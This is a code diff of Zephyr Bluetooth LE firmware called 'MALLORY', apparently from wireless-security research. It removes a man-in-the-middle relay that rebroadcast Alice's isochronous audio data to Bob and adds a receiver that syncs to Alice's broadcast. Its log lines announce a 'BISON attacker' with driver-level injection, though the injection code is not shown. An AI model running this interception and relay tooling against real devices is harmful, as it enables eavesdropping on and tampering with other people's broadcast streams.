@@ -29,8 +29,6 @@
 
 #define BIS_ISO_CHAN_COUNT 2
 
-NET_BUF_POOL_FIXED_DEFINE(tx_pool, 40, 251, 0, NULL);
-
 static bool         per_adv_found;
 static bool         per_adv_lost;
 static bt_addr_le_t per_addr;
@@ -44,31 +42,6 @@ static K_SEM_DEFINE(sem_per_sync_lost, 0, 1);
 static K_SEM_DEFINE(sem_per_big_info, 0, 1);
 static K_SEM_DEFINE(sem_big_sync, 0, BIS_ISO_CHAN_COUNT);
 static K_SEM_DEFINE(sem_big_sync_lost, 0, BIS_ISO_CHAN_COUNT);
-
-static const struct bt_data ad[] = {
-    BT_DATA_BYTES(BT_DATA_FLAGS, (BT_LE_AD_GENERAL | BT_LE_AD_NO_BREDR)),
-    BT_DATA_BYTES(BT_DATA_UUID16_ALL, 0xaa, 0xfe),
-    BT_DATA(BT_DATA_NAME_COMPLETE, "MalloryISO", 10),
-};
-
-
-static struct bt_iso_chan_io_qos iso_tx_qos = {
-    .sdu = 40,
-    .rtn = 2,
-    .phy = BT_GAP_LE_PHY_2M,
-};
-
-static struct bt_iso_chan_qos iso_tx_chan_qos = {
-    .tx = &iso_tx_qos,
-};
-
-static struct bt_iso_chan iso_tx_chan_1;
-static struct bt_iso_chan iso_tx_chan_2;
-
-static struct bt_iso_chan *iso_tx_chans[] = {
-    &iso_tx_chan_1,
-    &iso_tx_chan_2
-};
 
 static void iso_recv(struct bt_iso_chan *chan, const struct bt_iso_recv_info *info, struct net_buf *buf);
 static void iso_connected(struct bt_iso_chan *chan);
@@ -203,27 +176,11 @@ static void iso_recv(struct bt_iso_chan *chan, const struct bt_iso_recv_info *in
         return;
     }
 
-    int err;
-    struct net_buf *tx_buf;
-
-    int index = -1;
-    if (chan == &bis_iso_chan[0]) index = 0;
-    else if (chan == &bis_iso_chan[1]) index = 1;
-
-    // Relay Logic
-    if (index >= 0) {
-        tx_buf = net_buf_alloc(&tx_pool, K_NO_WAIT);
-
-        if (tx_buf) {
-            net_buf_reserve(tx_buf, BT_ISO_CHAN_SEND_RESERVE);
-            net_buf_add_mem(tx_buf, buf->data, buf->len);
-
-            // Send the clean data to Bob
-            err = bt_iso_chan_send(&iso_tx_chans[index][0], tx_buf, info->seq_num);
-            if (err < 0) {
-                net_buf_unref(tx_buf);
-            }
-        }
+    // Log what we receive from Alice for debugging
+    if (buf->len >= 4) {
+        uint32_t count = sys_get_le32(buf->data);
+        printk("[MALLORY RX] Received from Alice: %u\n", count);
+        iso_recv_count++;
     }
 }
 
@@ -231,7 +188,6 @@ static void iso_connected(struct bt_iso_chan *chan)
 {
     printk("ISO Channel %p connected\n", chan);
 
-    // If this is an RX channel, setup the data path
     if (chan == &bis_iso_chan[0] || chan == &bis_iso_chan[1]) {
         k_sem_give(&sem_big_sync);
     }
@@ -268,7 +224,7 @@ int main(void)
         k_sleep(K_MSEC(100));
     }
     k_sleep(K_SECONDS(1));
-    printk("=== MALLORY (MITM RELAY) STARTED ===\n");
+    printk("=== MALLORY (BISON ATTACKER) STARTED ===\n");
 
     int err;
 
@@ -279,99 +235,35 @@ int main(void)
         return 0;
     }
 
-    // Configure TX Channels
-    iso_tx_chan_1.ops = &iso_ops;
-    iso_tx_chan_1.qos = &iso_tx_chan_qos;
-    iso_tx_chan_2.ops = &iso_ops;
-    iso_tx_chan_2.qos = &iso_tx_chan_qos;
-
-    // Create Advertising Set
-    struct bt_le_ext_adv *adv;
-    err = bt_le_ext_adv_create(BT_LE_EXT_ADV_NCONN, NULL, &adv);
-    if (err) {
-        printk("Failed to create advertising set (%d)\n", err);
-        return 0;
-    }
-
-    // Set Advertising Data (Show name "MalloryISO")
-    err = bt_le_ext_adv_set_data(adv, ad, ARRAY_SIZE(ad), NULL, 0);
-    if (err) {
-        printk("Failed to set advertising data (%d)\n", err);
-        return 0;
-    }
-
-    // Start Advertising
-    err = bt_le_ext_adv_start(adv, BT_LE_EXT_ADV_START_DEFAULT);
-    if (err) {
-        printk("Failed to start advertising (%d)\n", err);
-        return 0;
-    }
-    printk("[TX] Advertising started as 'MalloryISO'\n");
-
-    struct bt_le_per_adv_param per_adv_param = {
-        .interval_min = BT_GAP_ADV_FAST_INT_MIN_2,
-        .interval_max = BT_GAP_ADV_FAST_INT_MAX_2,
-        .options = BT_LE_PER_ADV_OPT_NONE,
-    };
-
-    err = bt_le_per_adv_set_param(adv, &per_adv_param);
-    if (err) {
-        printk("Failed to set periodic advertising parameters (%d)\n", err);
-        return 0;
-    }
-
-    err = bt_le_per_adv_start(adv);
-    if (err) {
-        printk("Failed to start periodic advertising (%d)\n", err);
-        return 0;
-    }
-    printk("[TX] Periodic Advertising started. Now creating BIG...\n");
-
-    // Create the BIG (Broadcast Isochronous Group) - The Pipe to Bob
-    struct bt_iso_big_create_param big_create_param = {
-        .num_bis = 2,
-        .bis_channels = iso_tx_chans,
-        .framing = BT_ISO_FRAMING_UNFRAMED,
-        .packing = BT_ISO_PACKING_SEQUENTIAL,
-        .interval = 10000,
-        .latency = 10,
-    };
-
-    struct bt_iso_big *big_tx;
-    err = bt_iso_big_create(adv, &big_create_param, &big_tx);
-    if (err) {
-        printk("Failed to create TX BIG (%d)\n", err);
-        return 0;
-    }
-    printk("[TX] BIG created. Waiting for data to relay...\n");
-
-	// Start Reception (Act as Bob to Alice)
+    // Register callbacks for scanning and sync
     bt_le_scan_cb_register(&scan_callbacks);
     bt_le_per_adv_sync_cb_register(&sync_callbacks);
 
     struct bt_le_per_adv_sync_param sync_create_param;
     struct bt_le_per_adv_sync *sync;
     struct bt_iso_big *big_rx;
-    uint32_t sem_timeout_us;
 
     do {
         reset_semaphores();
         per_adv_lost = false;
 
-        // Start Scanning
+        // Start Scanning for Alice
         per_adv_found = false;
-        printk("[RX] Scanning for Alice...\n");
+        printk("[MALLORY] Scanning for Alice...\n");
         err = bt_le_scan_start(BT_LE_SCAN_CUSTOM, NULL);
-        if (err) return 0;
+        if (err) {
+            printk("Scan start failed (err %d)\n", err);
+            return 0;
+        }
 
         // Wait for Alice
         err = k_sem_take(&sem_per_adv, K_FOREVER);
         if (err) return 0;
 
         bt_le_scan_stop();
-        printk("[RX] Found Alice. Creating Sync...\n");
+        printk("[MALLORY] Found Alice. Creating PA Sync...\n");
 
-        // Sync with Alice's PA
+        // Sync with Alice's Periodic Advertising
         bt_addr_le_copy(&sync_create_param.addr, &per_addr);
         sync_create_param.options = 0;
         sync_create_param.sid = per_sid;
@@ -384,7 +276,7 @@ int main(void)
             continue;
         }
 
-        // Wait for Sync Established
+        // Wait for PA Sync Established
         err = k_sem_take(&sem_per_sync, K_SECONDS(2));
         if (err) {
             printk("Sync timeout. Retrying...\n");
@@ -395,31 +287,34 @@ int main(void)
         // Wait for BIG Info
         err = k_sem_take(&sem_per_big_info, K_SECONDS(2));
         if (err) {
+            printk("BIG Info timeout. Retrying...\n");
             bt_le_per_adv_sync_delete(sync);
             continue;
         }
 
-        // Create BIG Sync (Connect to the stream)
-        printk("[RX] Creating BIG Sync (Listening to Alice)...\n");
+        printk("[MALLORY] Syncing to Alice's BIG (driver injection will activate)...\n");
         err = bt_iso_big_sync(sync, &big_sync_param, &big_rx);
         if (err) {
             printk("Failed to sync BIG (%d)\n", err);
+            bt_le_per_adv_sync_delete(sync);
             continue;
         }
 
-        // Wait for channels to be ready
+        // Wait for BIS channels to connect
         for (uint8_t chan = 0U; chan < BIS_ISO_CHAN_COUNT; chan++) {
             k_sem_take(&sem_big_sync, TIMEOUT_SYNC_CREATE);
         }
-        printk("[RX] BIG Sync Established. Relay is ACTIVE.\n");
+        
+        printk("[MALLORY] BIG Sync Established!\n");
+        printk("[MALLORY] Driver-level injection is now ACTIVE.\n");
 
         // Wait until we lose sync
         k_sem_take(&sem_per_sync_lost, K_FOREVER);
 
-        printk("[RX] Lost Sync with Alice. Cleaning up...\n");
+        printk("[MALLORY] Lost Sync with Alice. Cleaning up...\n");
         bt_iso_big_terminate(big_rx);
         bt_le_per_adv_sync_delete(sync);
-		k_sleep(K_MSEC(1000));
+        k_sleep(K_MSEC(1000));
 
     } while (true);
 }
